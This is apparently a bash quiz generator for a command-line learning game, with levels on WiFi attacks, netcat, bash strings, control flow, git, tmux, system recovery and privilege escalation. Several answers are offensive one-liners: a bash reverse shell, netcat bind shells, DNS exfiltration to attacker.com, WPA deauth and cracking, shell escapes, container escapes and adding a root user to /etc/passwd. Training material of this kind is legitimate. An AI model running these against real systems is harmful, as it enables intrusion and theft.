  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # WiFi attacks
  questions+=("Enable monitor mode on ${iface}|airmon-ng start ${iface}")
  questions+=("Scan for WiFi networks|airodump-ng ${iface}mon")
  questions+=("Capture handshake from specific AP|airodump-ng -c 6 --bssid ${mac} -w capture ${iface}mon")
  questions+=("Send deauth packets to force handshake|aireplay-ng -0 5 -a ${mac} ${iface}mon")
  questions+=("Crack WPA handshake with wordlist|aircrack-ng -w ${wordlist} capture.cap")

  # SMB/NetBIOS
  questions+=("List SMB shares anonymously on ${ip}|smbclient -L //${ip} -N")
  questions+=("Connect to SMB share|smbclient //${ip}/share -U ${user}")
  questions+=("Enumerate SMB with enum4linux|enum4linux -a ${ip}")

  # Netcat
  questions+=("Start reverse shell listener on port ${port}|nc -lvnp ${port}")
  questions+=("Connect to remote port|nc ${ip} ${port}")
  questions+=("Send file via netcat|nc ${ip} ${port} < file.txt")
  questions+=("Port scan with netcat|nc -zv ${ip} 1-1000")
  questions+=("Netcat bind shell|nc -lvnp ${port} -e /bin/bash")

  # Mass scanning
  questions+=("Mass scan all ports on subnet at 10k rate|masscan -p1-65535 ${ip%.*}.0/24 --rate 10000")
  questions+=("Masscan specific ports|masscan -p 22,80,443 ${ip%.*}.0/24 --rate 1000")

  # Security audit
  questions+=("Run full system security audit|lynis audit system")

  printf '%s\n' "${questions[@]}"
}

# Level 17: String & Arrays
gen_level17() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # Parameter expansion - removal (practical examples)
  questions+=("Extract filename from /path/to/${txt} (stored in \$path)|echo \${path##*/}")
  questions+=("Get parent directory from \$fullpath|echo \${fullpath%/*}")
  questions+=("Get extension from ${cfg} (stored in \$file)|echo \${file##*.}")
  questions+=("Remove extension from ${log} to get basename|echo \${file%.*}")
  questions+=("Create backup with .bak extension|cp ${cfg}{,.bak}")
  questions+=("Strip leading 'v' from version string \$ver (e.g., v1.2.3)|echo \${ver#v}")
  questions+=("Remove protocol from URL \$url (e.g., https://)|echo \${url#*://}")
  questions+=("Get domain from URL \$url (remove path)|echo \${url%%/*}")
  questions+=("Strip all leading directories from \$path|echo \${path##*/}")

  # Parameter expansion - substitution
  questions+=("Replace first 'old' with 'new' in \$var|echo \${var/old/new}")
  questions+=("Replace ALL 'old' with 'new' in \$var|echo \${var//old/new}")
  questions+=("Replace 'old' at START of \$var|echo \${var/#old/new}")
  questions+=("Replace 'old' at END of \$var|echo \${var/%old/new}")
  questions+=("Delete all spaces from \$var|echo \${var// /}")
  questions+=("Delete all digits from \$var|echo \${var//[0-9]/}")

  # Parameter expansion - substrings
  questions+=("Extract substring from position 5|echo \${var:5}")
  questions+=("Extract 3 chars starting at position 5|echo \${var:5:3}")
  questions+=("Get last 4 characters of \$var|echo \${var: -4}")
  questions+=("Get string length of \$var|echo \${#var}")

  # Parameter expansion - case
  questions+=("Convert \$var to lowercase|echo \${var,,}")
  questions+=("Convert \$var to uppercase|echo \${var^^}")
  questions+=("Capitalize first char of \$var|echo \${var^}")
  questions+=("Lowercase first char of \$var|echo \${var,}")

  # Parameter expansion - defaults
  questions+=("Use 'default' if \$var is unset|echo \${var:-default}")
  questions+=("Set \$var to 'default' if unset|echo \${var:=default}")
  questions+=("Error if \$var is unset|echo \${var:?error message}")
  questions+=("Use 'alt' if \$var IS set|echo \${var:+alt}")

  # Indexed arrays
  questions+=("Declare indexed array|declare -a arr")
  questions+=("Create array with values|arr=(one two three)")
  questions+=("Access first element|echo \${arr[0]}")
  questions+=("Access last element|echo \${arr[-1]}")
  questions+=("Get all array elements|echo \${arr[@]}")
  questions+=("Get array length|echo \${#arr[@]}")
  questions+=("Get array indices|echo \${!arr[@]}")
  questions+=("Append to array|arr+=(four)")
  questions+=("Delete array element at index 1|unset 'arr[1]'")
  questions+=("Slice array: elements 1-3|echo \${arr[@]:1:3}")

  # Associative arrays
  questions+=("Declare associative array|declare -A map")
  questions+=("Set associative array value|map[key]=value")
  questions+=("Create associative array inline|declare -A map=([k1]=v1 [k2]=v2)")
  questions+=("Get associative array value|echo \${map[key]}")
  questions+=("Get all keys of associative array|echo \${!map[@]}")
  questions+=("Get all values of associative array|echo \${map[@]}")
  questions+=("Check if key exists in array|[[ -v map[key] ]]")

  # Array operations
  questions+=("Loop over array elements|for x in \"\${arr[@]}\"; do echo \"\$x\"; done")
  questions+=("Loop with index|for i in \"\${!arr[@]}\"; do echo \"\$i: \${arr[\$i]}\"; done")
  questions+=("Join array with comma|IFS=','; echo \"\${arr[*]}\"")
  questions+=("Read file lines into array|mapfile -t arr < ${txt}|readarray -t arr < ${txt}")
  questions+=("Read command output into array|mapfile -t arr < <(ls)")
  questions+=("Copy array|arr2=(\"\${arr[@]}\")")
  questions+=("Merge two arrays|merged=(\"\${arr1[@]}\" \"\${arr2[@]}\")")

  printf '%s\n' "${questions[@]}"
}

# Level 18: Control Flow & Functions
gen_level18() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # if/else
  questions+=("Basic if statement|if [[ condition ]]; then cmd; fi")
  questions+=("if/else statement|if [[ cond ]]; then cmd1; else cmd2; fi")
  questions+=("if/elif/else|if [[ c1 ]]; then cmd1; elif [[ c2 ]]; then cmd2; else cmd3; fi")
  questions+=("Test if file exists and run|[[ -f ${txt} ]] && cat ${txt}")
  questions+=("Test if command succeeds|if grep -q error ${log}; then echo found; fi")
  questions+=("Negate condition|if ! [[ -f ${txt} ]]; then echo missing; fi")
  questions+=("Compound AND condition|if [[ -f ${txt} && -r ${txt} ]]; then cat ${txt}; fi")
  questions+=("Compound OR condition§if [[ -z \"\$var\" || \"\$var\" == \"default\" ]]; then echo empty; fi")

  # for loops (practical examples)
  questions+=("Process all .${ext} files in current dir|for f in *.${ext}; do echo \"Processing \$f\"; done")
  questions+=("Rename all .txt to .bak|for f in *.txt; do mv \"\$f\" \"\${f%.txt}.bak\"; done")
  questions+=("Retry curl until success (max ${n} tries)|for i in {1..${n}}; do curl -s url && break; sleep 1; done")
  questions+=("Loop over servers and check SSH|for h in srv1 srv2 srv3; do ssh -o ConnectTimeout=2 \$h uptime; done")
  questions+=("Process numbered files file1 to file${n}|for i in {1..${n}}; do cat file\$i; done")
  questions+=("C-style countdown from ${n}|for ((i=${n}; i>0; i--)); do echo \$i; done")
  questions+=("Loop over array elements|for item in \"\${arr[@]}\"; do echo \"\$item\"; done")
  questions+=("Loop over files in ${dir}/, skip dirs|for f in ${dir}/*; do [[ -f \"\$f\" ]] && echo \"\$f\"; done")

  # while loops
  questions+=("While loop basic|while [[ condition ]]; do cmd; done")
  questions+=("While read lines from file|while IFS= read -r line; do echo \"\$line\"; done < ${txt}")
  questions+=("While with counter|i=0; while ((i < ${n})); do echo \$i; ((i++)); done")
  questions+=("Infinite loop with break|while true; do cmd; [[ cond ]] && break; done")
  questions+=("While with continue|while read -r line; do [[ -z \"\$line\" ]] && continue; echo \"\$line\"; done < ${txt}")
  questions+=("Read command output line by line|while IFS= read -r line; do echo \"\$line\"; done < <(ls -la)")
  questions+=("Until loop (opposite of while)|until [[ -f ${txt} ]]; do sleep 1; done")

  # case statements
  questions+=("Basic case statement|case \"\$var\" in a) echo A;; b) echo B;; *) echo other;; esac")
  questions+=("Case with multiple patterns|case \"\$ext\" in sh|bash) echo shell;; py) echo python;; *) echo other;; esac")
  questions+=("Case for yes/no input|case \"\$ans\" in [Yy]*) echo yes;; [Nn]*) echo no;; *) echo invalid;; esac")
  questions+=("Case with glob patterns|case \"\$file\" in *.txt) echo text;; *.sh) echo script;; esac")

  # functions
  questions+=("Define simple function|func() { echo hello; }")
  questions+=("Function with local variable|func() { local x=5; echo \$x; }")
  questions+=("Function with arguments|func() { echo \"arg1: \$1, arg2: \$2\"; }")
  questions+=("Function with return value|func() { return 0; }; func && echo success")
  questions+=("Function returning string via stdout|func() { echo result; }; var=\$(func)")
  questions+=("Function with all args|func() { echo \"all args: \$@\"; }")
  questions+=("Function with arg count|func() { echo \"got \$# args\"; }")
  questions+=("Check function exists|type -t func &>/dev/null && echo exists")
  questions+=("Unset function|unset -f func")

  # trap and signals
  questions+=("Trap SIGINT (Ctrl+C)|trap 'echo caught' SIGINT")
  questions+=("Trap EXIT for cleanup|trap 'rm -f /tmp/lock' EXIT")
  questions+=("Trap multiple signals|trap 'cleanup' SIGINT SIGTERM EXIT")
  questions+=("Trap ERR for error handling|trap 'echo error at line \$LINENO' ERR")

  # error handling
  questions+=("Exit on any error|set -e")
  questions+=("Exit on undefined variable|set -u")
  questions+=("Fail on pipe error|set -o pipefail")
  questions+=("Strict mode combo|set -euo pipefail")
  questions+=("Check last command status|\$? -ne 0 && echo failed")
  questions+=("Run command, ignore failure§cmd || true")
  questions+=("Die function|die() { echo \"\$1\" >&2; exit 1; }")

  # debugging
  questions+=("Enable debug mode (print commands)|set -x")
  questions+=("Disable debug mode|set +x")
  questions+=("Dry run (print, don't execute)|set -n")

  printf '%s\n' "${questions[@]}"
}

# Level 28: ROOT (Apocalypse Mode)
gen_level28() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # === EMERGENCY RECOVERY ===
  questions+=("Remount root filesystem read-write|mount -o remount,rw /")
  questions+=("Emergency single-user mode|init 1|systemctl rescue")
  questions+=("Chroot into system mounted at /mnt|chroot /mnt /bin/bash")
  questions+=("Regenerate initramfs (Arch)|mkinitcpio -P")
  questions+=("Regenerate GRUB config|grub-mkconfig -o /boot/grub/grub.cfg")
  questions+=("Fix broken sudo (as root)|chmod 4755 /usr/bin/sudo; chown root:root /usr/bin/sudo")
  questions+=("Reset root password from recovery|passwd root")
  questions+=("Reinstall bootloader to MBR|grub-install /dev/sda")
  questions+=("Check and repair filesystem|fsck -y /dev/sda1")
  questions+=("Mount LUKS encrypted partition|cryptsetup open /dev/sda2 cryptroot && mount /dev/mapper/cryptroot /mnt")

  # === HARDCORE ONE-LINERS ===
  questions+=("Find and kill process using port ${port}|kill \$(lsof -t -i:${port})|fuser -k ${port}/tcp")
  questions+=("Find large files (>100M) modified in 24h|find / -type f -size +100M -mtime -1 2>/dev/null")
  questions+=("Watch for new connections in realtime|watch -n1 'ss -tn state established'")
  questions+=("Monitor file changes in directory|inotifywait -m -r ${dir}/")
  questions+=("Parallel compress all logs§find /var/log -name '*.log' | parallel gzip")
  questions+=("Find duplicate files by hash§find . -type f -exec md5sum {} + | sort | uniq -d -w32")
  questions+=("Extract all IPs from logs, count, sort§grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head")
  questions+=("Emergency disk space cleanup|find /var/log -name '*.gz' -mtime +7 -delete")
  questions+=("Find recently modified system files|find /etc -mmin -60 -type f 2>/dev/null")
  questions+=("List all open ports and processes§ss -tlpn | awk 'NR>1 {print \$4, \$6}'")

  # === NETWORK SURVIVAL ===
  questions+=("Quick port scan without nmap|for p in {1..1000}; do timeout 0.1 bash -c \"echo >/dev/tcp/${ip}/\$p\" 2>/dev/null && echo \$p; done")
  questions+=("Download file with pure bash (no curl/wget)|exec 3<>/dev/tcp/example.com/80; echo -e 'GET /file HTTP/1.0\\r\\n\\r\\n' >&3; cat <&3")
  questions+=("Simple HTTP server (Python)|python3 -m http.server ${port}")
  questions+=("Reverse shell (bash)|bash -i >& /dev/tcp/${ip}/${port} 0>&1")
  questions+=("Create SSH tunnel and background|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}")
  questions+=("Test if host is up (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up")
  questions+=("Exfil file via DNS (base64)§cat ${txt} | base64 | xargs -I{} dig {}.exfil.attacker.com")
  questions+=("Bind shell with netcat|nc -lvnp ${port} -e /bin/bash")
  questions+=("Encrypted netcat with openssl|openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}")
  questions+=("Pivot through host (proxychains setup)|ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}")

  # === SYSTEM FORENSICS ===
  questions+=("List all cron jobs system-wide|for u in \$(cut -f1 -d: /etc/passwd); do crontab -l -u \$u 2>/dev/null; done; cat /etc/crontab; ls /etc/cron.*")
  questions+=("Find files modified in last hour|find / -mmin -60 -type f 2>/dev/null")
  questions+=("List all users with shell access§grep -vE 'nologin|false' /etc/passwd")
  questions+=("Show failed login attempts§journalctl _COMM=sshd | grep -iE 'failed|invalid'§grep 'Failed' /var/log/auth.log")
  questions+=("Find hidden files in home dirs|find /home -name '.*' -type f 2>/dev/null")
  questions+=("Check for rootkits|chkrootkit|rkhunter --check")
  questions+=("Dump all environment variables|env; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'")
  questions+=("Show all listening processes with full path§ss -tlpn | awk 'NR>1 {print \$6}' | sed 's/.*:\\([0-9]*\\).*/\\1/' | xargs -I{} lsof -i:{}")
  questions+=("Find processes with deleted binaries|ls -la /proc/*/exe 2>/dev/null | grep deleted")
  questions+=("Memory dump of process|gcore -o dump \$(pgrep -f process)")

  # === DEFENSIVE HARDENING ===
  questions+=("Block IP with iptables|iptables -A INPUT -s ${ip} -j DROP")
  questions+=("Block IP with nftables|nft add rule inet filter input ip saddr ${ip} drop")
  questions+=("Rate limit SSH connections|iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT")
  questions+=("Enable SYN cookies|echo 1 > /proc/sys/net/ipv4/tcp_syncookies")
  questions+=("Disable IP forwarding|echo 0 > /proc/sys/net/ipv4/ip_forward")
  questions+=("Flush all firewall rules|iptables -F; iptables -X")
  questions+=("List all iptables rules|iptables -L -n -v")
  questions+=("List all nftables rules|nft list ruleset")
  questions+=("Audit failed sudo attempts|grep 'FAILED' /var/log/auth.log")
  questions+=("Lock user account§passwd -l ${user}§usermod -L ${user}")

  # === PROCESS NINJA ===
  questions+=("Watch memory hogs in realtime§watch -n1 'ps aux --sort=-%mem | head -5'")
  questions+=("Find process by open file§lsof ${txt}§fuser ${txt}")
  questions+=("Trace system calls of process|strace -p \$(pgrep -f process)")
  questions+=("Kill all processes by name|pkill -9 -f pattern")
  questions+=("Nice a running process|renice -n 10 -p PID")

  # === DISK SURVIVAL ===
  questions+=("Find disk usage hogs§du -xh / 2>/dev/null | sort -rh | head -20")
  questions+=("Clear systemd journal logs|journalctl --vacuum-size=100M")
  questions+=("Sync and drop caches|sync; echo 3 > /proc/sys/vm/drop_caches")
  questions+=("Check disk health (SMART)|smartctl -a /dev/sda")
  questions+=("Secure wipe file|shred -vfz -n 3 ${txt}")
  questions+=("Create RAM disk|mount -t tmpfs -o size=512M tmpfs /mnt/ramdisk")
  questions+=("Clone disk with progress|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync")

  # === PURE BASH MAGIC ===
  questions+=("Random string generator|tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 32")
  questions+=("Timestamp in epoch|date +%s")
  questions+=("Convert epoch to date|date -d @1234567890")
  questions+=("Parallel execution with xargs|cat urls.txt | xargs -P 10 -I{} curl -s {}")
  questions+=("Timeout a command|timeout 5 long_running_cmd")
  questions+=("Retry command until success|until cmd; do sleep 1; done")
  questions+=("Lock file to prevent concurrent runs§exec 200>/tmp/lock; flock -n 200 || exit 1")
  questions+=("Named pipe (FIFO)|mkfifo /tmp/pipe; cmd1 > /tmp/pipe & cmd2 < /tmp/pipe")

  # === OFFLINE/AIR-GAPPED ===
  questions+=("Create bootable USB|dd if=arch.iso of=/dev/sdb bs=4M status=progress oflag=sync")
  questions+=("Generate SSH key (no network needed)|ssh-keygen -t ed25519 -f ~/.ssh/offline_key")
  questions+=("Encrypt file for offline transport|gpg -c --cipher-algo AES256 ${txt}")

  printf '%s\n' "${questions[@]}"
}

# Level 21: Git
gen_level21() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local remote=$(_pick REMOTE_HOSTS)

  # Basics
  questions+=("Initialize new git repo|git init")
  questions+=("Clone repo from URL|git clone https://github.com/user/repo.git")
  questions+=("Clone repo to specific dir|git clone https://github.com/user/repo.git mydir")
  questions+=("Check repo status|git status")
  questions+=("Show current branch|git branch --show-current|git rev-parse --abbrev-ref HEAD")

  # Staging & committing
  questions+=("Stage file '${txt}' for commit|git add ${txt}")
  questions+=("Stage all changed files|git add -u")
  questions+=("Stage all files including untracked|git add -A|git add --all")
  questions+=("Stage interactively (hunks)|git add -p|git add --patch")
  questions+=("Commit with message|git commit -m \"message\"")
  questions+=("Commit all tracked changes|git commit -am \"message\"|git commit -a -m \"message\"")
  questions+=("Amend last commit message|git commit --amend -m \"new message\"")
  questions+=("Amend last commit (add files)|git commit --amend --no-edit")

  # Branches
  questions+=("List all branches|git branch -a|git branch --all")
  questions+=("Create new branch '${branch}'|git branch ${branch}")
  questions+=("Switch to branch '${branch}'|git checkout ${branch}|git switch ${branch}")
  questions+=("Create and switch to new branch '${branch}'|git checkout -b ${branch}|git switch -c ${branch}")
  questions+=("Delete local branch '${branch}'|git branch -d ${branch}")
  questions+=("Force delete local branch '${branch}'|git branch -D ${branch}")
  questions+=("Delete remote branch '${branch}'|git push origin --delete ${branch}")
  questions+=("Rename current branch|git branch -m newname")

  # Remote operations
  questions+=("Add remote origin|git remote add origin https://github.com/user/repo.git")
  questions+=("List remotes|git remote -v")
  questions+=("Fetch from remote|git fetch origin")
  questions+=("Pull branch '${branch}' from remote|git pull origin ${branch}")
  questions+=("Push branch '${branch}' to remote|git push origin ${branch}")
  questions+=("Push and set upstream|git push -u origin ${branch}|git push --set-upstream origin ${branch}")
  questions+=("Force push (dangerous)|git push --force origin ${branch}|git push -f origin ${branch}")

  # History & diff
  questions+=("Show commit log|git log")
  questions+=("Show log one line per commit|git log --oneline")
  questions+=("Show log with graph|git log --oneline --graph --all")
  questions+=("Show last ${n} commits|git log -${n}|git log -n ${n}")
  questions+=("Show diff of unstaged changes|git diff")
  questions+=("Show diff of staged changes|git diff --staged|git diff --cached")
  questions+=("Show diff between branches|git diff main..${branch}|git diff main ${branch}")
  questions+=("Show who changed each line|git blame ${txt}")
  questions+=("Search commits for string|git log -S \"searchterm\"")
  questions+=("Show file at specific commit|git show HEAD~${n}:${txt}")

  # Undoing
  questions+=("Unstage file '${txt}'|git reset HEAD ${txt}|git restore --staged ${txt}")
  questions+=("Discard changes to file '${txt}'|git checkout -- ${txt}|git restore ${txt}")
  questions+=("Reset to last commit (keep changes)|git reset --soft HEAD~1")
  questions+=("Reset to last commit (discard changes)|git reset --hard HEAD~1")
  questions+=("Revert a commit (new commit)|git revert HEAD")
  questions+=("Stash changes|git stash")
  questions+=("Stash with message|git stash push -m \"message\"")
  questions+=("Apply latest stash|git stash pop")
  questions+=("List stashes|git stash list")
  questions+=("Apply specific stash|git stash apply stash@{${n}}")

  # Merging & rebasing
  questions+=("Merge branch '${branch}' into current|git merge ${branch}")
  questions+=("Rebase current onto main|git rebase main")
  questions+=("Continue rebase after conflict|git rebase --continue")
  questions+=("Abort rebase|git rebase --abort")
  questions+=("Cherry-pick commit|git cherry-pick abc123")
  questions+=("Squash last ${n} commits|git rebase -i HEAD~${n}")

  # Tags
  questions+=("List tags|git tag")
  questions+=("Create lightweight tag|git tag v1.0.0")
  questions+=("Create annotated tag|git tag -a v1.0.0 -m \"Release 1.0\"")
  questions+=("Push tags to remote|git push --tags")
  questions+=("Delete tag|git tag -d v1.0.0")

  # Config
  questions+=("Set user name globally|git config --global user.name \"Name\"")
  questions+=("Set user email globally|git config --global user.email \"email@example.com\"")
  questions+=("List all config|git config --list")
  questions+=("Set default branch name|git config --global init.defaultBranch main")

  # Advanced
  questions+=("Find commit that introduced bug|git bisect start; git bisect bad; git bisect good abc123")
  questions+=("Clean untracked files (dry run)|git clean -n")
  questions+=("Clean untracked files|git clean -f")
  questions+=("Clean untracked files and dirs|git clean -fd")
  questions+=("Show reflog|git reflog")
  questions+=("Recover deleted branch from reflog|git checkout -b recovered abc123")

  printf '%s\n' "${questions[@]}"
}

# Level 13: Multiplexers (tmux & screen)
gen_level13() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # Session management
  questions+=("Start new tmux session|tmux|tmux new")
  questions+=("Start tmux session named 'mysession'|tmux new -s mysession|tmux new-session -s mysession")
  questions+=("List sessions|tmux ls|tmux list-sessions")
  questions+=("Attach to session|tmux attach|tmux a")
  questions+=("Attach to tmux session 'mysession'|tmux attach -t mysession|tmux a -t mysession")
  questions+=("Detach from session|Ctrl+b d")
  questions+=("Kill tmux session 'mysession'|tmux kill-session -t mysession")
  questions+=("Kill all sessions|tmux kill-server")
  questions+=("Rename session|Ctrl+b \$|tmux rename-session newname")
  questions+=("Switch sessions|Ctrl+b s")
  questions+=("Create new session from within tmux|Ctrl+b :new")

  # Windows (tabs)
  questions+=("Create new window|Ctrl+b c")
  questions+=("Next window|Ctrl+b n")
  questions+=("Previous window|Ctrl+b p")
  questions+=("Switch to window ${n}|Ctrl+b ${n}")
  questions+=("Rename current window|Ctrl+b ,")
  questions+=("List windows|Ctrl+b w")
  questions+=("Close current window|Ctrl+b &")
  questions+=("Find window|Ctrl+b f")
  questions+=("Move window|Ctrl+b .")

  # Panes (splits)
  questions+=("Split pane horizontally|Ctrl+b %")
  questions+=("Split pane vertically|Ctrl+b \"")
  questions+=("Switch to next pane|Ctrl+b o")
  questions+=("Switch pane by direction|Ctrl+b arrow")
  questions+=("Toggle pane zoom|Ctrl+b z")
  questions+=("Close current pane|Ctrl+b x")
  questions+=("Resize pane|Ctrl+b Ctrl+arrow")
  questions+=("Show pane numbers|Ctrl+b q")
  questions+=("Switch to pane by number|Ctrl+b q ${n}")
  questions+=("Convert pane to window|Ctrl+b !")
  questions+=("Rotate panes|Ctrl+b Ctrl+o")
  questions+=("Swap panes|Ctrl+b {|Ctrl+b }")
  questions+=("Even horizontal layout|Ctrl+b Alt+1")
  questions+=("Even vertical layout|Ctrl+b Alt+2")
  questions+=("Tiled layout|Ctrl+b Alt+5")

  # Copy mode
  questions+=("Enter copy mode|Ctrl+b [")
  questions+=("Exit copy mode|q")
  questions+=("Start selection in copy mode|Space")
  questions+=("Copy selection|Enter")
  questions+=("Paste buffer|Ctrl+b ]")
  questions+=("List buffers|Ctrl+b #")
  questions+=("Search forward in copy mode|/")
  questions+=("Search backward in copy mode|?")

  # Misc
  questions+=("Show time|Ctrl+b t")
  questions+=("Show key bindings|Ctrl+b ?")
  questions+=("Enter command mode|Ctrl+b :")
  questions+=("Reload config|tmux source-file ~/.tmux.conf")
  questions+=("Send prefix to nested tmux|Ctrl+b Ctrl+b")

  # CLI commands
  questions+=("Send keys to session|tmux send-keys -t mysession 'ls -la' Enter")
  questions+=("Capture pane output|tmux capture-pane -t mysession -p")
  questions+=("Save pane to file|tmux capture-pane -t mysession -p > output.txt")
  questions+=("Set option|tmux set -g mouse on")
  questions+=("List options|tmux show-options -g")

  # Screen (alternative)
  questions+=("Start screen session|screen")
  questions+=("Start screen session named 'mysession'|screen -S mysession")
  questions+=("List screen sessions|screen -ls")
  questions+=("Attach to screen|screen -r|screen -r mysession")
  questions+=("Detach from screen|Ctrl+a d")
  questions+=("New window in screen|Ctrl+a c")
  questions+=("Next window in screen|Ctrl+a n")
  questions+=("Split horizontally in screen|Ctrl+a S")
  questions+=("Split vertically in screen|Ctrl+a |")
  questions+=("Switch region in screen|Ctrl+a Tab")
  questions+=("Kill screen session 'mysession'|screen -X -S mysession quit")

  printf '%s\n' "${questions[@]}"
}

# Level 27: Privilege Escalation
gen_level27() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # SUID/SGID enumeration
  questions+=("Find all SUID binaries|find / -perm -4000 -type f 2>/dev/null")
  questions+=("Find SUID/SGID combined|find / -perm /6000 -type f 2>/dev/null")
  questions+=("Find files with capabilities|getcap -r / 2>/dev/null")

  # User enumeration
  questions+=("Show current user and groups|id")
  questions+=("Show sudoers rules|sudo -l")
  questions+=("Check sudo version (CVE check)|sudo --version")
  questions+=("Check if user in docker/lxd group|id | grep -E 'docker|lxd'")

  # System enumeration
  questions+=("Show OS and kernel version|uname -a")
  questions+=("Show running processes|ps aux")
  questions+=("Show network connections|ss -tlpn|netstat -tlpn")
  questions+=("Show cron jobs|cat /etc/crontab; crontab -l")
  questions+=("Show mounted filesystems|mount|df -h")

  # Config file hunting
  questions+=("Find config files with passwords|grep -ri 'password' /etc/ 2>/dev/null")
  questions+=("Check .bash_history|cat ~/.bash_history")
  questions+=("Find SSH keys|find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null")

  # GTFOBins-style exploits (representative examples)
  questions+=("SUID find shell escape|find . -exec /bin/sh -p \\; -quit")
  questions+=("SUID vim shell escape|vim -c ':!/bin/sh'")
  questions+=("SUID python shell|python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'")
  questions+=("Sudo env privesc|sudo env /bin/sh")

  # Kernel exploits prep
  questions+=("Check kernel exploits (searchsploit)|searchsploit linux kernel \$(uname -r)")

  # Docker/LXD escape
  questions+=("Docker socket check|ls -la /var/run/docker.sock")
  questions+=("Docker escape via socket|docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
  questions+=("LXD privilege escalation|lxc init ubuntu:18.04 privesc -c security.privileged=true")

  # Weak permissions
  questions+=("Check /etc/passwd writeable|ls -la /etc/passwd")
  questions+=("Check /etc/shadow readable|ls -la /etc/shadow")
  questions+=("Add user to /etc/passwd|echo 'hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd")
  questions+=("Check writable /etc/sudoers|ls -la /etc/sudoers")

  # Path hijacking
  questions+=("Check current PATH|echo \$PATH")
  questions+=("Prepend current dir to PATH|export PATH=.:$PATH")
  questions+=("Create malicious binary|echo '/bin/bash' > /tmp/ls && chmod +x /tmp/ls")
  questions+=("Exploit relative path in SUID|export PATH=/tmp:\$PATH && ./vulnerable_suid")

  # NFS
  questions+=("Check NFS exports|showmount -e ${ip}|cat /etc/exports")
  questions+=("Mount NFS with no_root_squash|mount -t nfs ${ip}:/share /mnt")
  questions+=("Create SUID on NFS|cp /bin/bash /mnt && chmod +s /mnt/bash")

  printf '%s\n' "${questions[@]}"
}

# Level 20: Advanced Regex
gen_level20() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # Regex lookahead/lookbehind (grep -P for PCRE)
  questions+=("Match 'error' followed by number|grep -P 'error(?=\\d)' ${log}")
  questions+=("Match 'error' NOT followed by number|grep -P 'error(?!\\d)' ${log}")
  questions+=("Match number preceded by '$'|grep -P '(?<=\\$)\\d+' ${log}")
  questions+=("Match number NOT preceded by '$'|grep -P '(?<!\\$)\\d+' ${log}")

  # Non-greedy matching
  questions+=("Non-greedy match between quotes|grep -oP '\".*?\"' ${log}")
  questions+=("Match shortest HTML tag|grep -oP '<.*?>' ${txt}")
  questions+=("Extract first word after colon|grep -oP ':\\s*\\K\\S+' ${log}")

  # Word boundaries and anchors
  questions+=("Match whole word 'error' only|grep -w 'error' ${log}|grep '\\berror\\b' ${log}")
  questions+=("Match 'error' at word boundary|grep -P '\\berror' ${log}")
  questions+=("Match lines starting with digit|grep '^[0-9]' ${txt}")
  questions+=("Match lines ending with digit|grep '[0-9]$' ${txt}")
  questions+=("Match empty lines|grep '^$' ${txt}")

  # Character classes
  questions+=("Match any vowel|grep '[aeiou]' ${txt}")
  questions+=("Match non-digit|grep '[^0-9]' ${txt}")
  questions+=("Match word character|grep '\\w' ${txt}")
  questions+=("Match whitespace|grep '\\s' ${txt}")
  questions+=("Match hex character|grep '[0-9a-fA-F]' ${txt}")

  # Quantifiers
  questions+=("Match exactly ${n} digits|grep -E '[0-9]{${n}}' ${log}")
  questions+=("Match ${n} or more digits|grep -E '[0-9]{${n},}' ${log}")
  questions+=("Match 2 to ${n} digits|grep -E '[0-9]{2,${n}}' ${log}")
  questions+=("Match optional 's' (plurals)|grep -E 'errors?' ${log}")

  # Groups and backreferences
  questions+=("Match repeated word|grep -P '\\b(\\w+)\\s+\\1\\b' ${txt}")
  questions+=("Match repeated character|grep -E '(.)\\1' ${txt}")
  questions+=("Capture and replace with sed|sed -E 's/(error):\\s*(.*)/\\2 [\\1]/' ${log}")
  questions+=("Swap two words|sed -E 's/(\\w+)\\s+(\\w+)/\\2 \\1/' ${txt}")

  # Advanced sed
  questions+=("Delete lines matching pattern|sed '/pattern/d' ${txt}")
  questions+=("Print only lines matching|sed -n '/pattern/p' ${txt}")
